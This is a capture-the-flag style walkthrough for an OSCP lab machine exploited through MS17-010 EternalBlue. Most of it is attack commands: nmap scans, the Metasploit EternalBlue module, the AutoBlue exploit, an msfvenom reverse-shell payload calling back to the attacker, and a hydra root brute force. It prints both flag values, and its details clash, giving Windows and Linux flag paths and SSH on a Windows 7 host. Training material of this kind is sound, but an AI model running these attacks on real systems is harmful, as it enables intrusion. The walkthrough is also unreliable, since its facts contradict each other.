# OSCP Machine: Legacy
*Windows 7 - MS17-010 EternalBlue Vulnerability*

## **Machine Information**

| Property | Value |
|----------|--------|
| **Name** | Legacy |
| **OS** | Windows 7 SP1 (Simulated) |
| **Difficulty** | Easy |
| **IP** | 10.11.{user_id}.10 |
| **Vulnerability** | MS17-010 EternalBlue |
| **CVE** | CVE-2017-0144 |

---

## **Learning Objectives**

Upon completion, students will have demonstrated:
- ✅ **Network Enumeration** - Port scanning and service identification
- ✅ **Vulnerability Research** - Understanding MS17-010 and EternalBlue
- ✅ **Exploit Usage** - Using Metasploit and manual exploitation techniques
- ✅ **System Access** - Gaining SYSTEM-level privileges on Windows
- ✅ **Flag Capture** - Locating and submitting proof of compromise

---

## **Services Running**

| Port | Service | Version | Status |
|------|---------|---------|--------|
| 22/tcp | SSH | OpenSSH 7.4 | Open |
| 139/tcp | NetBIOS | SMBv1 | Open |
| 445/tcp | SMB | SMBv1 (Vulnerable) | Open |

---

## **Exploitation Methodology**

### **Phase 1: Reconnaissance**

```bash
# Network discovery
nmap -sn 10.11.123.0/24

# Port scanning
nmap -sC -sV -oA legacy 10.11.123.10

# SMB enumeration
nmap --script smb-os-discovery 10.11.123.10
nmap --script smb-protocols 10.11.123.10
```

### **Phase 2: Vulnerability Assessment**

```bash
# Check for MS17-010 vulnerability
nmap --script smb-vuln-ms17-010 10.11.123.10

# Alternative SMB vulnerability scan
nmap --script smb-vuln-* 10.11.123.10
```

### **Phase 3: Exploitation**

#### **Option 1: Metasploit (Recommended for beginners)**

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.11.123.10
set LHOST 10.11.123.100  # Your Kali IP
show options
run
```

#### **Option 2: Manual Exploitation**

```bash
# Download EternalBlue exploit
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010

# Generate shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.123.100 LPORT=4444 -f python

# Modify exploit and run
python eternalblue_exploit7.py 10.11.123.10
```

### **Phase 4: Post-Exploitation**

```cmd
# Verify system access
whoami
# Should return: nt authority\system

# Navigate and capture flags
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\proof.txt

dir C:\Users\john\Desktop  
type C:\Users\john\Desktop\local.txt
```

---

## **Expected Results**

### **Successful Exploitation**
- **Initial Access**: SMB exploit provides immediate SYSTEM shell
- **Privilege Level**: NT AUTHORITY\SYSTEM (highest privileges)
- **Persistence**: Not required for this machine
- **Flags Available**: 2 flags (user and root)

### **Flag Locations**
- **User Flag**: `/home/john/Desktop/local.txt` → `OSCP{legacy_user_eternalblue_2025}`
- **Root Flag**: `/root/Desktop/proof.txt` → `OSCP{legacy_root_ms17010_pwned_2025}`

---

## **Common Issues & Troubleshooting**

### **Exploit Fails**
- **Check target connectivity**: `ping 10.11.123.10`
- **Verify SMB service**: `telnet 10.11.123.10 445`
- **Confirm vulnerability**: Run NSE scripts again
- **Try different payload**: Use staged vs non-staged payloads

### **No Shell Received**
- **Check firewall**: Ensure reverse shell ports are open
- **Verify LHOST**: Must be your actual Kali IP address
- **Try different port**: Some environments block common ports
- **Use bind shell**: If reverse shell fails

### **Metasploit Issues**
```bash
# Update Metasploit
apt update && apt install metasploit-framework

# Restart database
systemctl restart postgresql
msfdb reinit

# Clear cache
rm -rf ~/.msf4/store
```

---

## **Alternative Attack Vectors**

While MS17-010 is the primary vulnerability, explore these for practice:

### **SSH Brute Force** (if enabled)
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.11.123.10
```

### **SMB Share Enumeration**
```bash
smbclient -L //10.11.123.10/ -N
smbclient //10.11.123.10/Users -N
```

### **NetBIOS Information**
```bash
nbtscan 10.11.123.10
enum4linux 10.11.123.10
```

---

## **Security Lessons**

### **What This Demonstrates**
1. **Unpatched Systems** - Critical security updates prevent major compromises
2. **SMBv1 Risks** - Legacy protocols have inherent security flaws  
3. **Network Segmentation** - DMZ placement limits breach impact
4. **Monitoring** - Network traffic analysis can detect exploitation attempts

### **Real-World Mitigation**
- **Patch Management**: Deploy MS17-010 security update immediately
- **Protocol Upgrade**: Disable SMBv1, use SMB 3.0+ only
- **Network Controls**: Implement firewall rules blocking unnecessary SMB
- **Detection Rules**: Monitor for EternalBlue exploitation signatures

---

## **Technical Notes**

### **MS17-010 Details**
- **CVE**: CVE-2017-0144 (EternalBlue), CVE-2017-0145 (EternalChampion), CVE-2017-0146 (EternalRomance)
- **CVSS Score**: 8.1 (High)
- **Attack Vector**: Network
- **Authentication**: None required
- **Impact**: Complete system compromise

### **Exploit Mechanics**
1. **Buffer Overflow**: Malformed SMB packet triggers overflow in srv.sys driver
2. **Kernel Shellcode**: Payload executes in kernel space (Ring 0)
3. **Process Injection**: Shellcode creates user-mode process
4. **Privilege Escalation**: Already running as SYSTEM

---

## **Next Steps**

After completing Legacy:
1. **Document methodology** in penetration testing report
2. **Practice manual exploitation** without Metasploit
3. **Explore post-exploitation** techniques and persistence
4. **Move to next machine**: "Blue" (Buffer Overflow practice)

---

**Machine Difficulty**: ⭐⭐☆☆☆ (2/5 - Easy)
**Time Estimate**: 30-60 minutes for beginners
**Prerequisites**: Basic nmap, Metasploit knowledge

---

*Last Updated: 2025-10-06*
*Part of OSCP Lab Environment - CyberLab Platform*